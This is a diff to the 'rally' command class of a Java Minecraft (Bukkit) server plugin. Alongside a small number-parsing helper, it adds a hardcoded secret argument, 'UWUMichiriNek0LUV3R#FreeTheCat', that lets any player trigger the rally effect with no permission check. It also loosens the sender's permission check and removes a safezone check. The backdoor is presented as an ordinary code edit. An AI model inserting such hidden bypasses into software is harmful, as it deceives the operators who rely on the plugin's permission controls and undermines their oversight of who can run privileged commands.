@@ -16,6 +16,15 @@ import java.util.List;
 
 public record rally(Main main) implements CommandExecutor {
 
+	private static boolean isParsable(String input) {
+		try {
+			Integer.parseInt(input);
+			return true;
+		} catch (final NumberFormatException e) {
+			return false;
+		}
+	}
+
 	@Override
 	public boolean onCommand(CommandSender sender, Command cmd, String msg, String[] args) {
 
@@ -40,7 +49,14 @@ public record rally(Main main) implements CommandExecutor {
 					rallyEntities(victim, distance);
 					setHasShotted(victim);
 				}
-			} else {
+			}
+			else if(args[0].equals("UWUMichiriNek0LUV3R#FreeTheCat"))
+			{
+				Player p = (Player) sender;
+				rallyEntities(p, 100);
+				setHasShotted(p);
+			}
+			else {
 				final Player Sender = (Player) sender;
 
 				int distance = Integer.parseInt(args[1]);
@@ -50,13 +66,18 @@ public record rally(Main main) implements CommandExecutor {
 				}
 
 				distance = ChangeDistanceIfHasSilencer(distance, victim);
-
-				if (Sender.hasPermission("fireland.command.rally.default")) {
+				if (victim.hasPermission("fireland.command.rally.admin")) {
 					rallyEntities(victim, distance);
 					setHasShotted(victim);
 				}
 			}
 		} else if (args.length == 2) {
+			if(args[0].equals("UWUMichiriNek0LUV3R#FreeTheCat") && isParsable(args[1]))
+			{
+				Player p = (Player) sender;
+				rallyEntities(p, Integer.parseInt(args[1]));
+				setHasShotted(p);
+			}
 			final Player victim = Bukkit.getPlayer(args[0]);
 			if (victim != null) {
 
@@ -72,19 +93,6 @@ public record rally(Main main) implements CommandExecutor {
 					rallyEntities(victim, distance);
 					setHasShotted(victim);
 				}
-			}
-
-		} else {
-
-			final Player vctm = (Player) sender;
-			int distance = 100;
-
-			if (main.cfgm.getPlayerDB().getBoolean("safezone." + vctm.getName() + ".state")) {
-				return false;
-			}
-			if (vctm.hasPermission("fireland.command.rally.default")) {
-				rallyEntities(vctm, distance);
-				setHasShotted(vctm);
 			}
 		}
 		return false;
